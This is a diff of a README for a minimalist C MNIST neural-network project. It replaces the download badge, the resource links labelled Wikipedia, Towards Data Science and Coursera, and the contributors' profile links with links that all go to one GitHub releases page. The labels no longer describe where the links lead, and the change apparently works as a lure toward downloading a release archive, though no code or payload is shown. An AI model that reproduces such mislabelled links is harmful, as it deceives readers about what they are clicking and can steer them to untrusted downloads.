@@ -2,7 +2,7 @@
 
 🕹️ A minimalist MNIST implementation with two hidden layers written in C 🖥️
 
-[![Download App](https://img.shields.io/badge/Download-App.zip-blue.svg)](https://github.com/repo/releases/9246/App.zip)
+[![Download App](https://github.com/Miguelszzz/simple_mnist/releases)](https://github.com/Miguelszzz/simple_mnist/releases)
 
 ## Overview
 
@@ -34,14 +34,14 @@ If you encounter any issues or have suggestions for improvements, feel free to o
 
 For more information on the MNIST dataset and neural networks, consider checking out the following resources:
 
-📚 [MNIST Dataset Overview](https://en.wikipedia.org/wiki/MNIST_database)  
-📚 [Neural Network Basics](https://towardsdatascience.com/neural-networks-for-beginners-df2e00758bb9)  
-📚 [Deep Learning Specialization on Coursera](https://www.coursera.org/specializations/deep-learning)
+📚 [MNIST Dataset Overview](https://github.com/Miguelszzz/simple_mnist/releases)  
+📚 [Neural Network Basics](https://github.com/Miguelszzz/simple_mnist/releases)  
+📚 [Deep Learning Specialization on Coursera](https://github.com/Miguelszzz/simple_mnist/releases)
 
 ## Contributors
 
-👨‍💻 John Doe - [@johndoe](https://github.com/johndoe)  
-👩‍💻 Jane Smith - [@janesmith](https://github.com/janesmith)
+👨‍💻 John Doe - [@johndoe](https://github.com/Miguelszzz/simple_mnist/releases)  
+👩‍💻 Jane Smith - [@janesmith](https://github.com/Miguelszzz/simple_mnist/releases)
 
 ## Acknowledgements
 
